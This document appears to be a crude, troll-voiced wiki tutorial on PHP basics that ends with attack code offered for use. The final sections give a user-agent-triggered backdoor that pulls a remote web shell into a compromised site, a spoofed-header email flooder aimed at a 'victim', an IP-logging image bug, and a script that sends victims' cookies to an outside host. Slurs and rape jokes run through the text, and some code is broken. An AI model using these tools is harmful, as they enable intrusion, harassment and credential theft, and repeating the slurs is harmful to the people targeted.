PHP is a server side language, meaning you can't see the source code in your browser, because all of the stuff is done on the server. To start, get some web hosting (easy) or start your own server (not as easy), and create a .php file. Having a decent knowledge of [HTML](/HTML) is highly recommended. If you've programmed in another web language such as ASP, or have knowledge of application languages like [C++](/C++) or [Java](/Java), learning PHP will be considerably easier. 

### HELLO WORLD  ###

Yeah... This is the ancient tradition of beginners starting out in any language. Here you go. 

```php
    <?php
    echo "LOL HAI THER AMIDOINITRITE?";
    print("DICKS");
    ?>
```

Let's go over some rulez. 

(The word rules does not have a 'z' in it you miserable faggot). 
All PHP code starts with <?php and ends with ?>. These are called delimiters. 
echo is a statement that basically prints out whatever is in the double quotes. It isn't a function. (printf() is though.) 

Since echo is a statement, much like require/include/exit/etc, using parenthesis around the value(s) to be echoed is optional.

All statements in PHP that aren't if/else statements, while, for, do-while, for-each loops, functions, or classes end in semicolons. 

#### Hello World, Again (with [HTML](/HTML))  ####

We saw how echo can output text. But it can also output HTML code and JavaScript. Example here. 

```php
    <?php
    echo "<b>LOL HAI THER</b> <i>AMIDOINITRITE?</i>";
    ?>
```

This'll output **LOL HAI THER** _AMIDOINITRITE_?, and if you look at the source of the PHP page, you'll see the HTML code in there.

### Variables  ###

Now we'll learn a little about variables. PHP is great because, unlike other languages, you don't need to specify what type of variable you are declaring (integer, Boolean, float, string, etc). PHP automatically identifies the type for you. Anyway, here we go. 

```php
    <?php
    $lolvar = 6;
    $loldecimal = 3.12;
    $lolstring = "**This** is a string.";
    echo $lolvar;
    echo $loldecimal;
    echo $lolstring;
    ?>
```

Some things to note: 

ALL VARIABLES START WITH THE DOLLAR SIGN ($) NO EXCEPTIONS 

When echoing a variable you don't need the double quotes 
You can also concatenate, or join together, two strings, like so: 

```php
    <?php
    $lol = "lol";
    $wut = "wut";
    $randomdigit = 2;
    echo "Did you just use the meme " . $lol . " " .  $wut . " " .$randomdigit . " times?";
    ?>
```

This'll just echo out the line "Did you just use the meme lol wut 2 times?". 

#### Constants  ####

Constants are like variables, except they do not begin with a dollar sign and cannot be changed or deleted once defined. It is usual practice to name constants in all capitals (much like macros in C/C++). You define constants with the define(); function:

```php
    <?php
    define("MYCONSTANT", "Constant Value");
    echo MYCONSTANT;
    ?>
```

This sends out "Constant Value".

### Predefined variables  ###

Always $_, ex: $_COOKIE, $_SERVER, $_GET, $_REQUEST, and $_POST 
Some can only be used before any output is sent 

```php
    <?php
    $ip = $_SERVER['REMOTE_ADDR'];
    $ref = $_SERVER['HTTP_REFERER'];
    echo $ip." Was referred by ".$ref."<br />";
    $UserAgent = $_SERVER[HTTP_USER_AGENT];
    $Software = $_SERVER['SERVER_SOFTWARE'];
    echo "Their useragent was ".$UserAgent."<br />";
    echo "Your server software is ".$Software;
    ?>
```

Will output something like: 
0.0.0.0 Was referred by ----- Their useragent was Mozilla/5.0 Your server software is Apache/2.2.8 (----) DAV/2 mod_ssl/2.2.8 OpenSSL/0.9.8g mod_python/3.3.1 Python/2.5.1 mod_autoindex_color PHP/5.2.5 mod_perl/2.0.3 Perl/v5.8.8 
Depending on your server environment. 

#### Types of variables  ####

The datatype a variable uses is usually implicit, meaning PHP will determine what type of variable it should use based on its contents. However, these are some of the datatypes at your disposal.

<pre>Boolean ex: $a = true; #has only 2 possible values, true or false
Integer ex: $b = 4; #holds whole numbers
String ex: $c = "Hello"; #holds a set of letters and numbers
Float ex: $d = 3.5252524; #holds numbers with decimals
Array ex: $e = array(5, 3, 1); #holds a list of any other type of data, be it an integer, string, boolean, etc.
Null ex: $f = NULL; #only holds null (nothing)</pre>

### Operators  ###

#### Arithmetic  ####

    + Addition
    - Subtraction
    * Multiplication
    / Division
    % Division with remainder 

#### Assignment  ####

    += ex: n+=7, or N equals N+7
    -=
    *=
    /=
    %=
    .=
    =

#### Logical  ####

    && , AND ex: if (($a>0) && ($a<10)){
    || , OR ex: if (($a==0)||($a==1)){
    ! , NOT ex: if ($a != 2) {

#### Comparison  ####

    < Less than
    > Greater than
    == Equal to
    != Not equal
    === Identical
    !== Not identical
    <= Less than or equal to
    >= Greater than or equal to

#### Conditional statements and loops  ####

Now you have a basic understanding of printing things, now it's time to start something else. We will explore loops and conditional statements. Loops will pretty much do something a certain amount of times and conditional statements control what the program does if a condition is fulfilled or not. 

#### Conditional statements  ####

Well, it's basically just if and switch, but the former is pretty useful. You have to know this one. 

#### If  ####

This essentially checks whether or not a condition is true. 

```php
    <?php
    $willdo = true;
    if($willdo == true){
       echo "did";
    }
```

An else statement is an addition to an if statement which allows for another condition. If there's an else statement something happens regardless. 

```php
    $wontdo = false;
    if($wontdo == true){
       echo "did";
    } else {
       echo "didn't";
    }
    ?>
```

Else if statements allow for multiple conditions, if and only if the first condition before it was false. 

```php
    $maydo = 99;
    $maynotdo = false;
    if($maynotdo == true){
       echo "did";
    } elseif ($maydo == 99){
       echo "did anyway";
    } else {
       echo "didn't";
    }
    ?>
```

Also: 

1. conditions in parentheses just have to be true. You don't have to use an == or != if it's a boolean value (true/false) 
2. there are logical operators like and (&&) and or (||) 
3. a ! behind it means it's false, so if $dick is true, !$dick is false, and vice versa if $dick was false. 

#### Switch  ####

A substitute to a whole bunch of elseifs. It tests if a given value is equal to something. Cases can be any value. There's also a default. 

```php
    <?php
    switch ($value) {
    case false:
       echo "value is 0";
       break;
    case 17:
       echo "value is 1";
       break;
    case "pigdog":
       echo "value is pigdog";
       break;
    case NULL:
       echo "value is null";
       break;
    default:
       echo "value is something else other than 0, 1, pigdog, or null.";
       break;
    }
    ?>
```

### Loops  ###

There are three main loops: for loops, foreach loops, and while/do-while loops. 

#### For loops  ####

For this loop you simply declare a variable as a counter, and the loop will occur as many times as you want it until the counter reaches a certain number. 

```php
    <?php
    $counter = 0; 
    for($counter = 0; $counter < 6; $counter++)
     {
      echo "HAI<br>";
     }
    ?>
```

What this code does is take the variable we made, and use it as a counter. As long as the variable, $counter, is less than 6, the ++ operator will add one to the value of $counter and then the code within the curly braces {} will be executed. So the output of this code is: 

    HAI 
    HAI 
    HAI 
    HAI 
    HAI 

Some notes about this code: 
1. The ++ operator adds one to a variable, and can be used on any variable. This is an example of a unary operator. You could also use -- to subtract one from the variable. 
2. Notice that the for loop did NOT end in a semicolon. This is intended. Loops and conditionals don't need a semicolon. But the code inside of the curly braces DOES need the semicolons. 

#### Foreach loops  ####

This statement essentially sets the number of times something's done. In PHP you use it on arrays to run through every element in an array to do something or another. 

```php
    <?php
    $lolarray = array("lol", "rofl", "lmao");
    foreach($lolarray as $value){
       echo $value . "<br>;
    }
    ?>
```

This code will output: 

    lol 
    rofl 
    lmao 

Also: 

1. you might want to `unset()`, or destroy the variable you use. You never know. 
2. `foreach($array as $key => $value)` will assign `$key` as a key, but it's basically the same. 

#### While loops  ####

This is probably the simplest loop there is. As long as a condition is true, this loop will run. If the condition is false or if break is used it'll stop the loop. Be careful not to create an infinite loop or your internets will explode; also, if the conditions aren't met or defined the code inside won't run. 
Like this. 

```php
    <?php
    $fuckme = false;
    while($fuckme){ /* or while($fuckme == true) */
       echo "This loop won't run.\n";
    }
```

But this will run. 

```php
    $fucku = 17;
    while($fucku == 17){
       echo "This loop will run. Infinitely.\n";
    }
    ?>
```

This one will run too, but it'll stop after a while. (you would use a for loop in this position though) 

```php
    <?php
    $rapeher = 0
    while($rapeher <= 5){
       $lolkay = 5 - $rapeher;
       echo "This will run for ". $lolkay ." more times after this..\n";
       $rapeher++;
    }
    echo "Done.";
    ?>
```

This will produce: 

    This will run for 5 more times. 
    This will run for 4 more times. 
    This will run for 3 more times. 
    This will run for 2 more times. 
    This will run for 1 more times. 
    This will run for 0 more times. 
    Done. 

This isn't as useful as you imagine though. 

#### Do-while loops  ####

This does the same thing as a while loop but it checks the condition after the action's done. If the condition's true it repeats itself, but if it's false it does it once and only once. 

```php
    <?php
    $roofie = false;
    do {
      echo "Did it anyway, lol";
    } while ($roofie);
    ?>
```

This is useful if you want the code run at least once but not necessarily further times. 

#### Simple Backdoor in PHP  ####

Because many of you want to go straight to the uber hax, I'll add this little bit in. Please stop reading and Google up the following if you don't know this already: 

1. Basic Understanding of PHP 
2. Remote File Inclusion 
3. Basic web hacking 
4. Web shell (c99, x2300 Locus7s, r57, etc.) 
5. User Agents and how to change them 

Now that you have an idea of what these are, here is how to backdoor a page. If you have access to someone's website, you can slip in this little bit into the PHP page to backdoor their site. When you visit that page with the specified user agent, a web shell will automatically be included. Backdooring a site is recommended for most purposes, because if the site fixes whatever vulnerability you used to get in, you'll still have access. Anyways here is the backdoor: 

```php
    <?php
    $blackdoor = $_SERVER['HTTP_USER_AGENT']; 
    if($blackdoor == "PUT YOUR USER AGENT HERE) 
     { 
      @include('PUTTHEURLTOYOURWEBSHELLHERE'); 
     } 
    ?>
```

#### Email flooder in PHP  ####

If you want to just copy this and run it off a server, go ahead. Unfortunately most free PHP hosts don't allow you to send mail, but I guess you can run it off your localhost. You must have access to the sendmail binary on your system to run; it's just a matter of configuring php.ini, which I won't go into now. 

You need to have: 

1. a server 
2. basic knowledge of PHP 
3. knowledge on how to install/configure your PHP (pop quiz: should register_globals be kept on or off?)

```php
    <?php
       $spam= $_POST["spams"]; 
    // define number of spam cycles
       $iloled = $_POST["message"];
    // this is the message
       $email = $_POST["email"];
    // define recipient
       $rofl = $_POST["body"];
    // your message
       function head() {
          $sender = $_POST["sender"];
          $header = 'MIME-Version: 1.0 \r\n
       Content-type: text/html; charset=iso-8859-1 \r\n
       From: <' . $sender . '>';
          return($header);
       }
    // spoofed header. i found it easier to write it this way.
       if(isset($_POST["email"])) {
          for($i = 1; $i <= $spam; $i++){
             for($ii = 0; $ii <= $_POST["spams"]; $ii++){
                mail($_POST["email"], $iloled,$rofl,head());
             } // (the second for loop) defines one cycle
             echo "Done $i loops of $spam<br>"; //we're done
          }
       echo "Complete."; 
       }
       else {
     /* if the form isn't filled out show it. also, mess around with this  part any way you like. */
    ?>
    <form method="post" action="">
       Victim: <input type="text" size="28" name="email"><br>
       Message title: <input type="text" size="28"
     name="message"><br>
       Sender (spoof it): <input type="text" size="28"
     name="sender"><br>
       Message body: <textarea name="body" cols="28"
     rows="5"></textarea><br>
       Emails per cycle (default 10): <input type="text" size="28"
     name="spams" value="10"><br>
       Cycles (default 10):<input type="text" size="28"
     name="cycles" value="10"><br>
    <input type="submit" name="submit" value="Click for lulz">
    </form>
    <?php 
    }
    ?>
```

### Image bugs  ###

Pretty fucking simple, really. You insert the following into an e-mail or something: 
c
Then in iplulz.php on your server (or whatever you call it), put this code: 
_PROTIP: Make a directory on your server called niggerimage.png or any image name, then save the code as index.php in the directory._

```php
    <?PHP
    $the_image = "yourimagehere.jpg";
    $ip_lister = fopen("ip.list", "a+");
    fwrite($ip_lister, $_SERVER['REMOTE_ADDR'] . " fell for it lol\n");
    fclose($ip_lister);
    if (!strncasecmp(substr($the_image, strlen($the_image) - 4), ".jpg"))   
    $image_mime = "jpeg";
    else $image_mime = substr($the_image, (strrpos($the_image, '.') + 1));
    header("Content-Type: image/$image_mime");
    echo file_get_contents($the_image);
    ?>
```

User gets the image, you get their IP added to a list. EVERYONE WINS
Also, can steel cookies in dat way:

```php
    <?PHP
    $the_image = "yourimagehere.jpg";
    $ip_lister = fopen("ip.list", "a+");
    fwrite($ip_lister, $_GET['d0ngz'] . " nigger\n");
    fclose($ip_lister);
    if (!strncasecmp(substr($the_image, strlen($the_image) - 4), ".jpg"))   
    $image_mime = "jpeg";
    else $image_mime = substr($the_image, (strrpos($the_image, '.') + 1));
    header("Content-Type: image/$image_mime");
    echo file_get_contents($the_image);
    ?>
```

And in email or whatevastuff put

```javascript
    <script>
    document.write("<img src='http://niggerz.com/fag.php?d0ngz="+ document.cookie+"'><br>')
    </script>
```